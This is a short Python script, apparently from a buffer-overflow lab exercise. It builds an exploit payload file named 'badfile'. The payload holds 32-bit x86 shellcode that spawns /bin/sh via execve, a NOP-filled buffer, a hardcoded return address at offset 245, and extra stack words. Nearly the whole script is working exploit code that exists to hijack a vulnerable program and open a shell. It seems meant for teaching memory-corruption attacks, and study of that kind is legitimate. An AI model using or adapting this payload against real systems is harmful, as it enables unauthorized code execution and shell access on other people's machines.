#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's


##################################################################
# Put the shellcode somewhere in the payload
ret    = 0xffffcab7           
offset = 245

content = bytearray(0x90 for i in range(offset))


start = 0               
content[start:start + len(shellcode)] = shellcode


            

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
content[offset + 4: offset + 8] = (ret).to_bytes(L, byteorder='little')
content[offset + 8: offset + 12] = (0xFFFFFFFF).to_bytes(L, byteorder='little')
content[offset + 12: offset + 16] = (25).to_bytes(L, byteorder='little')


##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
